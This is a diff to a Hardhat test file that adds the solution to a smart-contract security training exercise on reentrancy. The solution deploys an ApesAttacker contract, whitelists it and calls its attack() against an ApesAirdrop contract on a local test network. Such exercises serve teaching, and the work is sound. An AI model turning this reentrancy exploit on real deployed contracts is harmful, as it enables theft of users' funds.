@@ -6,6 +6,7 @@ import { expect } from "chai";
 import {
     ApesAirdrop,
     ApesAirdrop__factory,
+    ApesAttacker,
     ApesAttacker__factory,
 } from "../../typechain-types";
 
@@ -21,6 +22,7 @@ describe("Reentrancy Exercise 2", function () {
     const TOTAL_SUPPLY = 50;
 
     let airdrop: ApesAirdrop;
+    let attack: ApesAttacker;
 
     before(async function () {
         /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
@@ -34,7 +36,13 @@ describe("Reentrancy Exercise 2", function () {
             deployer
         )) as ApesAirdrop__factory;
 
+        const ApesAttackerFactory = (await ethers.getContractFactory(
+            "contracts/reentrancy-2/ApesAttacker.sol:ApesAttacker",
+            attacker
+        )) as ApesAttacker__factory;
+
         airdrop = await ApesAirdropFactory.deploy();
+        attack = await ApesAttackerFactory.deploy(airdrop.address, attacker.address);
 
         await airdrop.addToWhitelist(users.map((user) => user.address));
 
@@ -47,6 +55,9 @@ describe("Reentrancy Exercise 2", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR SOLUTION HERE */
+        await airdrop.connect(attacker).grantMyWhitelist(attack.address)
+        await attack.connect(attacker).attack()
+        
     });
 
     after(async function () {
